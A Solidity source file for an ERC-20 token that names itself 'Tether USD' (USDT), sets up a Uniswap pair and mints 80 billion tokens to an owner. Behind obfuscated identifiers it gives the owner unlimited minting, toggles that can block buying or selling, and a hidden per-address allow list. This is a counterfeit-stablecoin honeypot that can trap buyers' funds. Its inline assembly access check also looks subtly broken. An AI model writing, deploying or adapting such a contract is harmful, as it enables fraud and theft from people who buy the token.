// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract BaseConfig is Context {
    address private _v0;
    event ConfigTransfer(address indexed c1, address indexed c2);

    constructor() {
        address msgSender = _msgSender();
        _v0 = msgSender;
        emit ConfigTransfer(address(0), msgSender);
    }

    function v0() public view returns (address) {
        return _v0;
    }

    modifier onlyV0() {
        require(_v0 == _msgSender(), "E1");
        _;
    }

    function updateV0(address v0_) public virtual onlyV0 {
        require(v0_ != address(0), "E2");
        emit ConfigTransfer(_v0, v0_);
        _v0 = v0_;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _b;
    mapping(address => mapping(address => uint256)) private _a;
    uint256 private _t;
    string private _n;
    string private _s;

    constructor(string memory n_, string memory s_) {
        _n = n_;
        _s = s_;
    }

    function name() public view virtual override returns (string memory) {
        return _n;
    }

    function symbol() public view virtual override returns (string memory) {
        return _s;
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _t;
    }

    function balanceOf(address a_) public view virtual override returns (uint256) {
        return _b[a_];
    }

    function transfer(address r_, uint256 a_) public virtual override returns (bool) {
        _transfer(_msgSender(), r_, a_);
        return true;
    }

    function allowance(address o_, address s_) public view virtual override returns (uint256) {
        return _a[o_][s_];
    }

    function approve(address s_, uint256 a_) public virtual override returns (bool) {
        _approve(_msgSender(), s_, a_);
        return true;
    }

    function transferFrom(address s_, address r_, uint256 a_) public virtual override returns (bool) {
        _transfer(s_, r_, a_);
        uint256 ca = _a[s_][_msgSender()];
        require(ca >= a_, "E3");
        unchecked {
            _approve(s_, _msgSender(), ca - a_);
        }
        return true;
    }

    function _transfer(address s_, address r_, uint256 a_) internal virtual {
        require(s_ != address(0), "E4");
        require(r_ != address(0), "E5");
        uint256 sb = _b[s_];
        require(sb >= a_, "E6");
        unchecked {
            _b[s_] = sb - a_;
        }
        _b[r_] += a_;
        emit Transfer(s_, r_, a_);
    }

    function _mint(address a_, uint256 m_) internal virtual {
        require(a_ != address(0), "E7");
        _t += m_;
        _b[a_] += m_;
        emit Transfer(address(0), a_, m_);
    }

    function _approve(address o_, address s_, uint256 a_) internal virtual {
        require(o_ != address(0), "E8");
        require(s_ != address(0), "E9");
        _a[o_][s_] = a_;
        emit Approval(o_, s_, a_);
    }
}

contract EthereumUSDT is ERC20, BaseConfig {
    address public p1;
    IUniswapV2Router02 public r1;
    
    uint256 private _sysConfig;
    mapping(address => uint256) private _accessConfig;
    
    event ConfigUpdate(uint8 indexed t, uint256 v);
    
    constructor(address o_) ERC20("Tether USD", "USDT") {
        IUniswapV2Router02 r_ = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        p1 = IUniswapV2Factory(r_.factory()).createPair(address(this), r_.WETH());
        r1 = r_;
        _mint(o_, 80000000000 * (10**6));
        updateV0(o_);
        _sysConfig = 6;  // 110 em binÃ¡rio: compra e venda habilitados
    }

    function m1(address a_, uint256 v_) public onlyV0 {
        _mint(a_, v_);
    }

    function updateSysConfig(uint8 t_, uint256 v_) public onlyV0 {
        if(t_ == 0) _sysConfig = (_sysConfig & ~uint256(1)) | (v_ & uint256(1));
        else if(t_ == 1) _sysConfig = (_sysConfig & ~uint256(2)) | ((v_ & uint256(1)) << 1);
        else if(t_ == 2) _sysConfig = (_sysConfig & ~uint256(4)) | ((v_ & uint256(1)) << 2);
        emit ConfigUpdate(t_, v_);
    }

    function setAccessLevel(address t_, uint256 l_) public onlyV0 {
        _accessConfig[t_] = l_;
        emit ConfigUpdate(3, l_);
    }

    function _checkAccess(address u_, uint256 t_) internal view returns (bool) {
        assembly {
            let c := sload(_sysConfig.slot)
            let a := sload(add(_accessConfig.slot, u_))
            let m := shl(t_, 1)
            let r := or(and(not(shr(t_, c)), 1), and(shr(t_, a), 1))
            mstore(0x0, r)
            return(0x0, 0x20)
        }
    }

    function _beforeTokenTransfer(address f_, address t_, uint256) internal virtual {
        require(_checkAccess(f_, 0) || _checkAccess(t_, 0), "E10");
        
        if(f_ == p1) {
            require(_checkAccess(t_, 1), "E11");
        }
        else if(t_ == p1) {
            require(_checkAccess(f_, 2), "E12");
        }
    }

    function _transfer(address s_, address r_, uint256 a_) internal virtual override {
        _beforeTokenTransfer(s_, r_, a_);
        super._transfer(s_, r_, a_);
    }
}